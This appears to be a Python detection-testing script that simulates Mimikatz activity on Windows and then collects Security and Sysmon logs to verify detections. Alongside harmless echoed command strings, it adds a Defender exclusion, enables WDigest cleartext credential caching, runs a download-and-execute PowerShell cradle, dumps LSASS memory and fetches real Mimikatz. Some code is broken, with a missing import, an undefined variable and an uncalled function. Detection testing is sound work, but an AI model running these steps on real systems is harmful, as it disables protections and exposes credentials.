import os
import subprocess
import time
import collector_security as export_security_logs
import collector_sysmon as export_sysmon_logs
#import run_mimikatz

# Define the directory to store tools
tools_dir = "C:\\temp\\tools"
os.makedirs(tools_dir, exist_ok=True)
zip_file = os.path.join(tools_dir, "mimikatz.zip")
mimikatz_exe = os.path.join(tools_dir, "mimikatz_extracted", "x64", "mimikatz.exe")


# Function to download Mimikatz from GitHub
def download_mimikatz():
    if os.path.exists(mimikatz_exe):
        print("[*] Mimikatz is already present. Skipping download.")
        return True 
    else:    
        print("[*] Downloading Mimikatz from GitHub...")
        ps_cmd = (
            f"powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile '{zip_file}'\""
        )
        subprocess.run(ps_cmd, shell=True, check=False)
        return True
    
# Function to extract Mimikatz
def extract_mimikatz():
    if not os.path.exists(zip_file):
        print(f"[!] Mimikatz zip file not found: {zip_file}")
        return False
    
    print("[*] Extracting Mimikatz...")
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)
    print("[+] Mimikatz extracted successfully.")
    return True

# Function to run the collector scripts at the end of the test run
def start_collectors():
    """Executes the security and sysmon log collectors."""
    print("Running Security Log Collector...")
    export_security_logs.extract_security_logs("logs_security.json")

    print("Running Sysmon Log Collector...")
    export_sysmon_logs.extract_sysmon_logs("logs_sysmon.json")

    print("Collectors executed successfully.")

# Function to modify Windows Defender exclusions
def modify_defender_exclusions(path_to_exclude):
    print(f"[*] Adding Windows Defender exclusion via PowerShell: {path_to_exclude}")
    ps_cmd = (
        f"powershell -Command \"Add-MpPreference -ExclusionPath '{path_to_exclude}'\""
    )
    subprocess.run(ps_cmd, shell=True, check=False)


# Function to modify registry keys related to credential dumping
def modify_registry_keys():
    print("[*] Modifying two registry keys for security testing via cmd")
    registry_commands = [
        r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f'
    ]
    for cmd in registry_commands:
        subprocess.run(cmd, shell=True, check=False)
    
    # Attempt to modify LSA registry key with error handling
    try:
        subprocess.run("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Registry modification failed: {e}")


# Function to trigger test security events
def trigger_test_events():
    print("Generating Mimikatz-like events for testing")

    # Modify Defender exclusions
    modify_defender_exclusions("C:\\temp\\tools")
    
    # Modify registry keys
    modify_registry_keys()

    # Download dummy Mimikatz and run .ps1 file
    print("[*] Testing Resource Development, by downloading en running PowerShell script:")
    download_url = "https://raw.githubusercontent.com/akaBetsy/DetectMimikatz/main/mimikatz_dummy.ps1"
    download_sim = f"IEX (New-Object Net.WebClient).DownloadString('{download_url}')"
    subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", download_sim], shell=True)
   
    # Simulate Mimikatz execution EXE
    print("[*] Testing Mimikatz Execution EXE")
    test_commands = [
        "cmd.exe /c start /b mimikatz.exe",
        "cmd.exe /c echo mimika",
        "cmd.exe /c echo mim.exe",
        "cmd.exe /c echo mkat",
#        "cmd.exe /c start /b powershell -Command Invoke-Mimikatz",
    ]
    for cmd in test_commands:
        subprocess.run(cmd, shell=True)
        
    # Simulate Mimikatz Privilege Escalation
    print("[*] Testing Mimikatz Privilege Escalation")
    test_commands = [
        "cmd.exe /c echo privilege::debug",
        "cmd.exe /c echo sekurlsa::pth",
        "cmd.exe /c echo kerberos::ptt",
        "cmd.exe /c echo token::elevate",
    ]
    for cmd in test_commands:
        subprocess.run(cmd, shell=True)
        
    # Simulate Mimikatz Credentials Access
    print("[*] Testing Mimikatz Credentials Access")
    test_commands = [
        "cmd.exe /c echo sekurlsa::logonpasswords",
        "cmd.exe /c echo lsadump::dcsync",
        "cmd.exe /c echo sekurlsa::wdigest",
    ]
    for cmd in test_commands:
        subprocess.run(cmd, shell=True)
        
    # Simulate LSASS memory access
    print("[*] Testing LSASS access")
    subprocess.run("tasklist /FI \"IMAGENAME eq lsass.exe\"", shell=True)
    subprocess.run("procdump -accepteula -ma lsass.exe lsass.dmp", shell=True)
    subprocess.run("powershell.exe -Command \"Get-Process lsass\"", shell=True)

    # Simulate NTDS.dit access
    print("[*] Testing NTDS.dit file access detection...")
    subprocess.run(["cmd.exe", "/c", "echo Accessing ntds.dit"], shell=True)

    print("[*] Mimikatz simulation events triggered.")
    time.sleep(5)

    print("[*] Generation of Mimikatz-like events completed. Downloading, extracting and starting Mimikatz.")

# Download Gentilkiwi Mimikatz from Github
    if download_mimikatz():
        extract_mimikatz
    time.sleep(5)

    print("[*] Mimikatz test finished. Running the collector scripts to verify detections.")
    time.sleep(2)


# Run the collector scripts SYSMON and SECURITY
    start_collectors()
    time.sleep(5)

    print("[*] Collector scripts finished. Inspect logs_security.JSON and logs_sysmon.JSON to verify detections.")

if __name__ == "__main__":
    trigger_test_events()
